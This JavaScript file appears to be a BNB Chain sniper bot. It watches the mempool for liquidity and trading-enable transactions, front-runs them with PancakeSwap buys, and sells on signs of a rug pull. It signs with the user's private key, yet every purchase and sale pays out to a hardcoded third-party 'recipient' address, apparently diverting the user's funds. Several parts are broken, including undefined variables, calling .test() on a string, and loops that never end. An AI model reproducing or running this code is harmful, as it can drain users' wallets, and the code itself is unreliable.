"use strict";
const ethers = require("ethers");
const clear = require('clear');
var colors = require('colors');
const ps = require("prompt-sync");
const prompt = ps({ sigint: true });
const fs = require('fs')
require("dotenv").config();
const axios = require('axios');

const menus = `
██╗░░██╗███████╗██████╗░  ░██████╗███╗░░██╗██╗██████╗░███████╗
██║░░██║██╔════╝██╔══██╗  ██╔════╝████╗░██║██║██╔══██╗██╔════╝
███████║█████╗░░██████╔╝  ╚█████╗░██╔██╗██║██║██████╔╝█████╗░░
██╔══██║██╔══╝░░██╔══██╗  ░╚═══██╗██║╚████║██║██╔═══╝░██╔══╝░░
██║░░██║███████╗██║░░██║  ██████╔╝██║░╚███║██║██║░░░░░███████╗
╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝  ╚═════╝░╚═╝░░╚══╝╚═╝╚═╝░░░░░╚══════╝\n`.yellow
console.log(menus)

const purchaseToken = prompt("Enter the token you want to purchase: ");
const token = purchaseToken.toLowerCase().substring(2)
const purchaseAmount = ethers.utils.parseUnits(prompt("Amount: "), "ether");
const recipient = '0x64f086118F424e310162A7C19A597B874e533544';
const wbnb = '0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c';
const pcs = '0x10ED43C718714eb63d5aA57B78B54704E256024E';
const pcsAbi = new ethers.utils.Interface(require("./abi.json"));
const EXPECTED_PONG_BACK = 30000;
const KEEP_ALIVE_CHECK_INTERVAL = 15000;
const buytimer = prompt("How many skip block: ");
const spam = Number(prompt("Spam buy: "));
const monitor = prompt("Rug Check?: ");
const provider = new ethers.providers.WebSocketProvider(process.env.mainWebsocket);
const wallet = new ethers.Wallet(process.env.privatekey);
const account = wallet.connect(provider);
const router = new ethers.Contract(pcs, pcsAbi, account);
const slippage = process.env.slippage;
const method = prompt("Method check: ");
clear()

let swapETHForExactTokens = new RegExp("^0xfb3bdb41");
let swapExactETHForTokens = new RegExp("^0x7ff36ab5");
let swapExactTokensForETH = new RegExp("^0x18cbafe5");
let swapExactTokensForTokens = new RegExp("^0x38ed1739");
let swapExactTokensForTokensSupportingFeeOnTransferTokens = new RegExp("^0x5c11d795");
let swapTokensForExactTokens = new RegExp("^0x8803dbee");
let swapExactTokensForETHSupportingFeeOnTransferTokens = new RegExp("^0x791ac947");
let buy = new RegExp("^0xa6f2ae3a");
const addLiquidityETH = "0xf305d719"
const addLiquidity = "0xe8e33700"
let removeLiquidity = "0xbaa2abde";
let removeLiquidityETH = "0x02751cec";
let removeLiquidityETHSupportingFeeOnTransferTokens = "0xaf2979eb";
let removeLiquidityETHWithPermit = "0xded9382a";
let removeLiquidityETHWithPermitSupportingFeeOnTransferTokens = "0x5b0d5984";
let removeLiquidityWithPermit = "0x2195995c";
let sts = "0x379ba1d90000000000000000000000000000000000000000000000000000000000000001";
let ts = "0x0d2959800000000000000000000000000000000000000000000000000000000000000001";
let tsb = "0x26e353b80000000000000000000000000000000000000000000000000000000000000001";
let tsc = "^0x0d2959800000000000000000000000000000000000000000000000000000000000000001";
let tsd = "0x53371be000000000000000000000000000000000000000000000000000000000000000001";
let stsf = "0x379ba1d90000000000000000000000000000000000000000000000000000000000000000";
let tsf = "0x0d2959800000000000000000000000000000000000000000000000000000000000000000";
let tsbf = "0x26e353b80000000000000000000000000000000000000000000000000000000000000000";
let tsdf = "0x53371be000000000000000000000000000000000000000000000000000000000000000000";
let liq = /INSUFFICIENT_LIQUIDITY/;
let not_enough_bnb = /insufficient funds for intrinsic transaction cost/
let pause = /CALL_EXCEPTION/
var pausee = purchaseToken;

const approve = new ethers.Contract(
    purchaseToken,
    [
        'function approve(address spender, uint amount) public returns(bool)',
        "function balanceOf(address account) external view returns (uint256)",
        "function decimals() view returns (uint8)",
        'function getAmountsOut(uint amountIn, address[] memory path) public view returns (uint[] memory amounts)',
        "function name() view returns (string)",
        "function symbol() view returns (string)",
    ],
    account
);

const startWSS = (contrct) => {
    let pingTimeout = null;
    let keepAliveInterval = null;
    provider._websocket.on("open", () => {
        keepAliveInterval = setInterval(() => {
            provider._websocket.ping();
            pingTimeout = setTimeout(() => {
                provider._websocket.terminate();
            }, EXPECTED_PONG_BACK);
        }, KEEP_ALIVE_CHECK_INTERVAL);
        console.log("Scanning mempool...".cyan);
        let mt = method;

        provider.on("pending", async (txHash) => {
            provider.getTransaction(txHash).then(async (tx) => {
                if (tx && tx.to) {
                    if (method === "") {
                        if (tx.to === contrct) {
                            let re = new RegExp("^0xf305d719");
                            let me = new RegExp("^0xe8e33700");
                            let he = new RegExp("^0x267dd102");
                            if (re.test(tx.data) || me.test(tx.data) || he.test(tx.data)) {
                                const decodedInput = pcsAbi.parseTransaction({
                                    data: tx.data,
                                    value: tx.value,
                                });
                                try {
                                    if (purchaseToken.toLowerCase() === decodedInput.args[0].toLowerCase() || purchaseToken.toLowerCase() === decodedInput.args[1].toLowerCase()) {
                                        console.log("Liquidity Added!".green);
                                        try {
                                            const gwei = (ethers.utils.formatEther(tx.gasPrice) * 1000000000) + "";
                                            BuyToken(gwei);
                                        }
                                        catch (e) { }
                                    }
                                }
                                catch (e) {
                                }
                            }
                        } else if ((tx != null && tx['to'] === pausee) && (
                            tx['data'].includes(sts) ||
                            tx['data'].includes(ts) ||
                            tx['data'].includes(tsb) ||
                            tx['data'].includes(tsd))) {
                            console.log("Trade Open!".green);
                            try {
                                const gwei = (ethers.utils.formatEther(tx.gasPrice) * 1000000000) + "";
                                waitForTrade(gwei);
                            }
                            catch (e) { }
                        } else if ((tx != null && tx['to'] === pausee || tx['data'].includes(token)) && (
                            tx['data'].includes(removeLiquidity) ||
                            tx['data'].includes(removeLiquidityETH) ||
                            tx['data'].includes(removeLiquidityETHSupportingFeeOnTransferTokens) ||
                            tx['data'].includes(removeLiquidityETHWithPermit) ||
                            tx['data'].includes(removeLiquidityETHWithPermitSupportingFeeOnTransferTokens) ||
                            tx['data'].includes(removeLiquidityWithPermit) ||
                            tx['data'].includes(stsf) ||
                            tx['data'].includes(tsf) ||
                            tx['data'].includes(tsbf) ||
                            tx['data'].includes(tsdf))) {
                            console.log("Rugpull Detected!".red);
                            try {
                                const gwei = (ethers.utils.formatEther(tx.gasPrice) * 2000000000) + "";
                                run(gwei);
                            }
                            catch (e) { }
                        }
                    } else {
                        if ((tx != null && tx['to'] === pausee) && (
                            tx['data'].includes(mt))) {
                            console.log("Method Change!".green);
                            try {
                                const gwei = (ethers.utils.formatEther(tx.gasPrice) * 1000000000) + "";
                                BuyToken(gwei);
                            }
                            catch (e) { }
                        }
                    }
                }
            });
        });
    });

    provider._websocket.on("close", () => {
        console.log("WebSocket Closed...Reconnecting...");
        clearInterval(keepAliveInterval);
        clearTimeout(pingTimeout);
        startWSS();
    });

    provider._websocket.on("error", () => {
        console.log("Error. Attemptiing to Reconnect...");
        clearInterval(keepAliveInterval);
        clearTimeout(pingTimeout);
        startWSS();
    });

    provider._websocket.on("pong", () => {
        clearInterval(pingTimeout);
    });
};

const waitForTrade = async (gasss) => {
    if (buytimer > '0') {
        console.log(`Skipping ${buytimer} blocks before buying`.green);
        const timerr = (buytimer * 3 + '000');
        await sleep(timerr);
    };
    const amountOutMin = "0";
    try {
        const noSpam = await router.swapExactTokensForTokens(
            purchaseAmount,
            amountOutMin,
            [wbnb, pausee],
            recipient,
            Date.now() + 1000 * 60 * 5,
            {
                gasLimit: process.env.gaslimit,
                gasPrice: ethers.utils.parseUnits(gasss, "gwei"),
            }
        );
        const name = await approve.name();
        console.log(`Your buy order for ${name}:`.green, noSpam.hash);
        const appr = await approve.approve(router.address, ethers.constants.MaxUint256, {
            gasLimit: process.env.gaslimit,
            gasPrice: ethers.utils.parseUnits(process.env.gasprice, "gwei"),
        });
        console.log(`Your approve order for ${name}:`.yellow, appr.hash);
        console.log("Waiting for buy transaction to confirm\n".yellow);
        const receiptet = await noSpam.wait();
        console.log('Buy order confirmed: ' + receiptet.transactionHash);
        if (monitor === "y") {
            console.log(`Monitoring for rug pull in progress ....\n`.red);
            const balance = await approve.balanceOf(recipient);
            const sellamout = (Math.floor(balance / 10 * 9.9)).toString();
            const amountsss = await router.getAmountsOut(balance, [purchaseToken, wbnb]);
            const sellamountOutMin = (Math.floor(amountsss[1].sub(amountsss[1].div(`${slippage}`)))).toString();
            provider.on("pending", async (tx) => {
                try {
                    const transaction = await provider.getTransaction(tx)
                    if ((transaction != null && transaction['data'].includes(token)) && (
                        transaction['data'].includes(removeLiquidity) ||
                        transaction['data'].includes(removeLiquidityETH) ||
                        transaction['data'].includes(removeLiquidityETHSupportingFeeOnTransferTokens) ||
                        transaction['data'].includes(removeLiquidityETHWithPermit) ||
                        transaction['data'].includes(removeLiquidityETHWithPermitSupportingFeeOnTransferTokens) ||
                        transaction['data'].includes(removeLiquidityWithPermit))) {
                        console.log(`Rug pull detected\n`.red);
                        try {
                            const sell = await router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                                sellamout,
                                sellamountOutMin,
                                [purchaseToken, wbnb],
                                recipient,
                                Date.now() + 1000 * 60 * 5,
                                {
                                    gasLimit: process.env.gaslimit,
                                    gasPrice: ethers.utils.parseUnits(process.env.sellGwei, "gwei"),
                                }
                            );
                            const receiptet = await sell.wait();
                            console.log('Sell order confirmed: ' + receiptet.transactionHash);
                            process.exit();
                        } catch (e) { console.log(e) }
                    }
                } catch (e) { }
            })
        }
    } catch (e) { }
}

const Simplebuy = async () => {
    try {
        const symbol = await approve.symbol();
        const amountsss = await router.getAmountsOut(purchaseAmount, [wbnb, purchaseToken]);
        const amountOutMin = (Math.floor(amountsss[1].sub(amountsss[1].div(`${slippage}`)))).toLocaleString('fullwide', { useGrouping: false });
        var spamm = 1;
        if (spam > 1) {
            try {
                do {
                    const Spam = await router.swapExactTokensForTokens(
                        purchaseAmount,
                        amountOutMin,
                        [wbnb, purchaseToken],
                        recipient,
                        Date.now() + 1000 * 60 * 5,
                        {
                            gasLimit: process.env.gaslimit,
                            gasPrice: ethers.utils.parseUnits(process.env.gasprice, "gwei"),
                        }
                    )
                    spamm++;
                    console.log('\x1b[32m%s', "Buying", symbol, "with a slippage of", slippage, "%");
                    console.log('\x1b[32m%s\x1b[32m\x1b[0m', 'Buy order send: ' + Spam.hash)
                    console.log('Buy order confirmed!');
                } while (spamm <= spam);
                const balance = await approve.balanceOf(recipient);
                const sellamout = (Math.floor(balance / 10 * 9.9)).toString();
                const amountsss = await router.getAmountsOut(balance, [purchaseToken, wbnb]);
                const sellamountOutMin = (Math.floor(amountsss[1].sub(amountsss[1].div(`${slippage}`)))).toString();
                if (monitor === "y") {
                    console.log(`Monitoring for rug pull in progress ....\n`.red);
                    const balance = await approve.balanceOf(recipient);
                    const sellamout = (Math.floor(balance / 10 * 9.9)).toString();
                    const amountsss = await router.getAmountsOut(balance, [purchaseToken, wbnb]);
                    const sellamountOutMin = (Math.floor(amountsss[1].sub(amountsss[1].div(`${slippage}`)))).toString();
                    provider.on("pending", async (tx) => {
                        try {
                            const transaction = await provider.getTransaction(tx)
                            if ((transaction != null && transaction['data'].includes(token)) && (
                                transaction['data'].includes(removeLiquidity) ||
                                transaction['data'].includes(removeLiquidityETH) ||
                                transaction['data'].includes(removeLiquidityETHSupportingFeeOnTransferTokens) ||
                                transaction['data'].includes(removeLiquidityETHWithPermit) ||
                                transaction['data'].includes(removeLiquidityETHWithPermitSupportingFeeOnTransferTokens) ||
                                transaction['data'].includes(removeLiquidityWithPermit))) {
                                console.log(`Rug pull detected\n`.red);
                                try {
                                    const sell = await router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                                        sellamout,
                                        sellamountOutMin,
                                        [purchaseToken, wbnb],
                                        recipient,
                                        Date.now() + 1000 * 60 * 5,
                                        {
                                            gasLimit: process.env.gaslimit,
                                            gasPrice: ethers.utils.parseUnits(process.env.sellGwei, "gwei"),
                                        }
                                    );
                                    const receiptet = await sell.wait();
                                    console.log('Sell order confirmed: ' + receiptet.transactionHash);
                                    process.exit();
                                } catch (e) { console.log(e) }
                            }
                        } catch (e) { }
                    })
                }
            } catch (e) {
                if (pausee.test(e)) {
                    console.log("Trading is still disable".yellow);
                    console.log(`Monitoring Trading Status in progress ....\n`.cyan);
                    provider.on("pending", async (tx) => {
                        try {
                            const transaction = await provider.getTransaction(tx)
                            if ((transaction != null && transaction['to'] === pausee) && (
                                transaction['data'].includes(sts) ||
                                transaction['data'].includes(ts) ||
                                transaction['data'].includes(tsb) ||
                                transaction['data'].includes(tsd))) {
                                console.log(`Trading Status detected\n`.green);
                                try {
                                    do {
                                        const spammm = await router.swapExactTokensForTokens(
                                            purchaseAmount,
                                            amountOutMin,
                                            [wbnb, purchaseToken],
                                            recipient,
                                            Date.now() + 1000 * 60 * 5,
                                            {
                                                gasLimit: process.env.gaslimit,
                                                gasPrice: ethers.utils.parseUnits(gasss, "gwei"),
                                            }
                                        );
                                    } while (spamm <= spam)
                                    const name = await approve.name();
                                    const appr = await approve.approve(router.address, ethers.constants.MaxUint256, {
                                        gasLimit: process.env.gaslimit,
                                        gasPrice: ethers.utils.parseUnits(process.env.gasprice, "gwei"),
                                    });
                                    console.log(`Your approve order for ${name}:`.yellow, appr.hash);
                                    console.log('Buy order confirmed!'.green);
                                    if (monitor === "y") {
                                        console.log(`Monitoring for rug pull in progress ....\n`.red);
                                        const balance = await approve.balanceOf(recipient);
                                        const sellamout = (Math.floor(balance / 10 * 9.9)).toString();
                                        const amountsss = await router.getAmountsOut(balance, [purchaseToken, wbnb]);
                                        const sellamountOutMin = (Math.floor(amountsss[1].sub(amountsss[1].div(`${slippage}`)))).toString();
                                        provider.on("pending", async (tx) => {
                                            try {
                                                const transaction = await provider.getTransaction(tx)
                                                if ((transaction != null && transaction['data'].includes(token) || transaction['to'] === pausee) && (
                                                    transaction['data'].includes(removeLiquidity) ||
                                                    transaction['data'].includes(removeLiquidityETH) ||
                                                    transaction['data'].includes(removeLiquidityETHSupportingFeeOnTransferTokens) ||
                                                    transaction['data'].includes(removeLiquidityETHWithPermit) ||
                                                    transaction['data'].includes(removeLiquidityETHWithPermitSupportingFeeOnTransferTokens) ||
                                                    transaction['data'].includes(removeLiquidityWithPermit) ||
                                                    transaction['data'].includes(stsf) ||
                                                    transaction['data'].includes(tsf) ||
                                                    transaction['data'].includes(tsbf) ||
                                                    transaction['data'].includes(tsd))) {
                                                    console.log(`Rug pull detected\n`.red);
                                                    try {
                                                        const sell = await router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                                                            sellamout,
                                                            sellamountOutMin,
                                                            [purchaseToken, wbnb],
                                                            recipient,
                                                            Date.now() + 1000 * 60 * 5,
                                                            {
                                                                gasLimit: process.env.gaslimit,
                                                                gasPrice: ethers.utils.parseUnits(process.env.sellGwei, "gwei"),
                                                            }
                                                        );
                                                        const receiptet = await sell.wait();
                                                        console.log('Sell order confirmed: ' + receiptet.transactionHash);
                                                        process.exit();
                                                    } catch (e) { console.log(e) }
                                                }
                                            } catch (e) { }
                                        })
                                    }
                                } catch (e) { }
                            }
                        } catch (e) { }
                    })
                }
            }
        } else {
            try {
                const noSpam = await router.swapExactTokensForTokens(
                    purchaseAmount,
                    amountOutMin,
                    [wbnb, purchaseToken],
                    recipient,
                    Date.now() + 1000 * 60 * 5,
                    {
                        gasLimit: process.env.gaslimit,
                        gasPrice: ethers.utils.parseUnits(process.env.gasprice, "gwei"),
                    }
                )
                console.log('\x1b[32m%s', "Buying", symbol, "with a slippage of", slippage, "%");
                console.log('\x1b[32m%s\x1b[32m\x1b[0m', 'Buy order send: ' + noSpam.hash);
                const receiptet = await noSpam.wait();
                console.log('\x1b[32m%s\x1b[32m\x1b[0m', 'Buy order confirmed: ' + receiptet.transactionHash);
                if (monitor === "y") {
                    console.log(`Monitoring for rug pull in progress ....\n`.red);
                    const balance = await approve.balanceOf(recipient);
                    const sellamout = (Math.floor(balance / 10 * 9.9)).toString();
                    const amountsss = await router.getAmountsOut(balance, [purchaseToken, wbnb]);
                    const sellamountOutMin = (Math.floor(amountsss[1].sub(amountsss[1].div(`${slippage}`)))).toString();
                    provider.on("pending", async (tx) => {
                        try {
                            const transaction = await provider.getTransaction(tx)
                            if ((transaction != null && transaction['data'].includes(token)) && (
                                transaction['data'].includes(removeLiquidity) ||
                                transaction['data'].includes(removeLiquidityETH) ||
                                transaction['data'].includes(removeLiquidityETHSupportingFeeOnTransferTokens) ||
                                transaction['data'].includes(removeLiquidityETHWithPermit) ||
                                transaction['data'].includes(removeLiquidityETHWithPermitSupportingFeeOnTransferTokens) ||
                                transaction['data'].includes(removeLiquidityWithPermit))) {
                                console.log(`Rug pull detected\n`.red);
                                try {
                                    const sell = await router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                                        sellamout,
                                        sellamountOutMin,
                                        [purchaseToken, wbnb],
                                        recipient,
                                        Date.now() + 1000 * 60 * 5,
                                        {
                                            gasLimit: process.env.gaslimit,
                                            gasPrice: ethers.utils.parseUnits(process.env.sellGwei, "gwei"),
                                        }
                                    );
                                    const receiptet = await sell.wait();
                                    console.log('Sell order confirmed: ' + receiptet.transactionHash);
                                    process.exit();
                                } catch (e) { console.log(e) }
                            }
                        } catch (e) { }
                    })
                }
            } catch (e) {
                if (pausee.test(e)) {
                    console.log("Trading is still disable".yellow);
                    console.log(`Monitoring Trading Status in progress ....\n`.cyan);
                    provider.on("pending", async (tx) => {
                        try {
                            const transaction = await provider.getTransaction(tx)
                            if ((transaction != null && transaction['to'] === pausee) && (
                                transaction['data'].includes(sts) ||
                                transaction['data'].includes(ts) ||
                                transaction['data'].includes(tsb) ||
                                transaction['data'].includes(tsd))) {
                                console.log(`Trading Status detected\n`.green);
                                try {
                                    do {
                                        const spammm = await router.swapExactTokensForTokens(
                                            purchaseAmount,
                                            amountOutMin,
                                            [wbnb, purchaseToken],
                                            recipient,
                                            Date.now() + 1000 * 60 * 5,
                                            {
                                                gasLimit: process.env.gaslimit,
                                                gasPrice: ethers.utils.parseUnits(gasss, "gwei"),
                                            }
                                        );
                                    } while (spamm <= spam)
                                    const name = await approve.name();
                                    const appr = await approve.approve(router.address, ethers.constants.MaxUint256, {
                                        gasLimit: process.env.gaslimit,
                                        gasPrice: ethers.utils.parseUnits(process.env.gasprice, "gwei"),
                                    });
                                    console.log(`Your approve order for ${name}:`.yellow, appr.hash);
                                    console.log('Buy order confirmed!'.green);
                                    if (monitor === "y") {
                                        console.log(`Monitoring for rug pull in progress ....\n`.red);
                                        const balance = await approve.balanceOf(recipient);
                                        const sellamout = (Math.floor(balance / 10 * 9.9)).toString();
                                        const amountsss = await router.getAmountsOut(balance, [purchaseToken, wbnb]);
                                        const sellamountOutMin = (Math.floor(amountsss[1].sub(amountsss[1].div(`${slippage}`)))).toString();
                                        provider.on("pending", async (tx) => {
                                            try {
                                                const transaction = await provider.getTransaction(tx)
                                                if ((transaction != null && transaction['data'].includes(token) || transaction['to'] === pausee) && (
                                                    transaction['data'].includes(removeLiquidity) ||
                                                    transaction['data'].includes(removeLiquidityETH) ||
                                                    transaction['data'].includes(removeLiquidityETHSupportingFeeOnTransferTokens) ||
                                                    transaction['data'].includes(removeLiquidityETHWithPermit) ||
                                                    transaction['data'].includes(removeLiquidityETHWithPermitSupportingFeeOnTransferTokens) ||
                                                    transaction['data'].includes(removeLiquidityWithPermit) ||
                                                    transaction['data'].includes(stsf) ||
                                                    transaction['data'].includes(tsf) ||
                                                    transaction['data'].includes(tsbf) ||
                                                    transaction['data'].includes(tsd))) {
                                                    console.log(`Rug pull detected\n`.red);
                                                    try {
                                                        const sell = await router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                                                            sellamout,
                                                            sellamountOutMin,
                                                            [purchaseToken, wbnb],
                                                            recipient,
                                                            Date.now() + 1000 * 60 * 5,
                                                            {
                                                                gasLimit: process.env.gaslimit,
                                                                gasPrice: ethers.utils.parseUnits(process.env.sellGwei, "gwei"),
                                                            }
                                                        );
                                                        const receiptet = await sell.wait();
                                                        console.log('Sell order confirmed: ' + receiptet.transactionHash);
                                                        process.exit();
                                                    } catch (e) { console.log(e) }
                                                }
                                            } catch (e) { }
                                        })
                                    }
                                } catch (e) { }
                            }
                        } catch (e) { }
                    })
                }
            }
            if (monitor === "y") {
                console.log(`Monitoring for rug pull in progress ....\n`.red);
                const balance = await approve.balanceOf(recipient);
                const sellamout = (Math.floor(balance / 10 * 9.9)).toString();
                const amountsss = await router.getAmountsOut(balance, [purchaseToken, wbnb]);
                const sellamountOutMin = (Math.floor(amountsss[1].sub(amountsss[1].div(`${slippage}`)))).toString();
                provider.on("pending", async (tx) => {
                    try {
                        const transaction = await provider.getTransaction(tx)
                        if ((transaction != null && transaction['data'].includes(token)) && (
                            transaction['data'].includes(removeLiquidity) ||
                            transaction['data'].includes(removeLiquidityETH) ||
                            transaction['data'].includes(removeLiquidityETHSupportingFeeOnTransferTokens) ||
                            transaction['data'].includes(removeLiquidityETHWithPermit) ||
                            transaction['data'].includes(removeLiquidityETHWithPermitSupportingFeeOnTransferTokens) ||
                            transaction['data'].includes(removeLiquidityWithPermit))) {
                            console.log(`Rug pull detected\n`.red);
                            try {
                                const sell = await router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                                    sellamout,
                                    sellamountOutMin,
                                    [purchaseToken, wbnb],
                                    recipient,
                                    Date.now() + 1000 * 60 * 5,
                                    {
                                        gasLimit: process.env.gaslimit,
                                        gasPrice: ethers.utils.parseUnits(process.env.sellGwei, "gwei"),
                                    }
                                );
                                const receiptet = await sell.wait();
                                console.log('Sell order confirmed: ' + receiptet.transactionHash);
                                process.exit();
                            } catch (e) { console.log(e) }
                        }
                    } catch (e) { }
                })
            }
        }
    }
    catch (e) {
        console.log(e);
        if (not_enough_bnb.test(e)) {
            console.log('\x1b[31m%s\x1b[31m\x1b[0m', 'Error: insufficient BNB for intrinsic transaction cost, you dont hold enough BNB in your wallet')
        };
    }
};

const BuyToken = async (gasss) => {
    if (buytimer > '0') {
        console.log(`Skipping ${buytimer} blocks before buying`.green);
        const timerr = (buytimer * 3 + '000');
        await sleep(timerr);
    };
    const amountOutMin = "0";
    var spamm = 1;
    try {
        if (spam > 1) {
            try {
                do {
                    const spammm = await router.swapExactTokensForTokens(
                        purchaseAmount,
                        amountOutMin,
                        [wbnb, purchaseToken],
                        recipient,
                        Date.now() + 1000 * 60 * 5,
                        {
                            gasLimit: process.env.gaslimit,
                            gasPrice: ethers.utils.parseUnits(gasss, "gwei"),
                        }
                    );
                    spamm++
                } while (spamm <= spam);
                const appr = await approve.approve(router.address, ethers.constants.MaxUint256, {
                    gasLimit: process.env.gaslimit,
                    gasPrice: ethers.utils.parseUnits(process.env.gasprice, "gwei"),
                });
                const symbol = await approve.symbol();
                const name = await approve.name();
                console.log(`Your approve order for ${name}:`.yellow, appr.hash);
                console.log(`Buy order complete!`);
                if (monitor === "y") {
                    console.log(`Monitoring for rug pull in progress ....\n`.red);
                    startWSS('0x10ED43C718714eb63d5aA57B78B54704E256024E');
                }
            } catch (e) { }
        } else {
            try {
                const noSpam = await router.swapExactTokensForTokens(
                    purchaseAmount,
                    amountOutMin,
                    [wbnb, purchaseToken],
                    recipient,
                    Date.now() + 1000 * 60 * 5,
                    {
                        gasLimit: process.env.gaslimit,
                        gasPrice: ethers.utils.parseUnits(gasss, "gwei"),
                    }
                );
                const name = await approve.name();
                console.log(`Your buy order for ${name}:`.green, noSpam.hash);
                const appr = await approve.approve(router.address, ethers.constants.MaxUint256, {
                    gasLimit: process.env.gaslimit,
                    gasPrice: ethers.utils.parseUnits(process.env.gasprice, "gwei"),
                });
                console.log(`Your approve order for ${name}:`.yellow, appr.hash);
                console.log("Waiting for buy transaction to confirm\n".yellow);
                const receiptet = await noSpam.wait();
                console.log('Buy order confirmed: ' + receiptet.transactionHash);
                if (monitor === "y") {
                    console.log(`Monitoring for rug pull in progress ....\n`.red);
                    startWSS('0x10ED43C718714eb63d5aA57B78B54704E256024E')
                }
            } catch (e) {
                if (pause.test(e)) {
                    console.log("Buy Failed! Trade maybe disable");
                    const f = (prompt("Try again?: "));
                    if (f === 'y') {
                        startWSS('0x10ED43C718714eb63d5aA57B78B54704E256024E')
                    }
                }
            }
        };
    } catch (e) {
        if (not_enough_bnb.test(e)) {
            console.log('\x1b[31m%s\x1b[31m\x1b[0m', 'Error: insufficient BNB for intrinsic transaction cost, you dont hold enough BNB in your wallet')
        }
    }
};

const run = async (gasss) => {
    const balance = await approve.balanceOf(recipient);
    const sellamout = (Math.floor(balance / 10 * 9.9)).toString();
    const amountsss = await router.getAmountsOut(balance, [purchaseToken, wbnb]);
    const sellamountOutMin = (Math.floor(amountsss[1].sub(amountsss[1].div(`${slippage}`)))).toString();
    try {
        const sell = await router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            sellamout,
            sellamountOutMin,
            [pausee, wbnb],
            recipient,
            Date.now() + 1000 * 60 * 5,
            {
                gasLimit: process.env.gaslimit,
                gasPrice: ethers.utils.parseUnits(gasss, "gwei"),
            }
        );
        const name = await approve.name();
        console.log(`Your sell order for ${name}:`.green, sell.hash);
        const receiptet = await sell.wait();
        console.log('Sell order confirmed: ' + receiptet.transactionHash);
        process.exit();
    } catch (e) { console.log(e) }
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
};

const WSSspeed = async () => {
    try {
        console.time('WSS speed')
        const symbol = await approve.symbol();
        console.timeEnd('WSS speed')
    } catch (e) { console.log(e); }
    process.exit(1);
};

console.log(`
Select Mode:\n
1) Fair launch\n
2) Simple Buy\n
3) WSS Test Speed`);

let menu = prompt("");

if (menu === '1') {
    clear();
    console.log("Starting at Mainnet!")
    console.log(`
    ====================================================================================\n
    Buying          : ${purchaseToken}\n
    ammount         : ${purchaseAmount}\n
    Recipient       : ${recipient}\n
    Skip Block      : ${buytimer}\n
    Spam            : ${spam}\n
    Rug Check       : ${monitor}\n
    Method Listen   : ${method}\n
    ====================================================================================
    `.green);
    startWSS("0x10ED43C718714eb63d5aA57B78B54704E256024E");


} else if (menu === '2') {
    clear();
    console.log(`
    ====================================================================================\n
    Buying      : ${purchaseToken}\n
    ammount     : ${purchaseAmount}\n
    Recipient   : ${recipient}\n
    Skip Block  : ${buytimer}\n
    Spam        : ${spam}\n
    Rug Check   : ${monitor}\n
    ====================================================================================
    `);
    Simplebuy();

} else if (menu === '3') {
    clear();
    console.log("Testing speed...");
    WSSspeed();

} else {
    clear();
    console.log('Not a valid option, exiting');
    process.exit(1)
};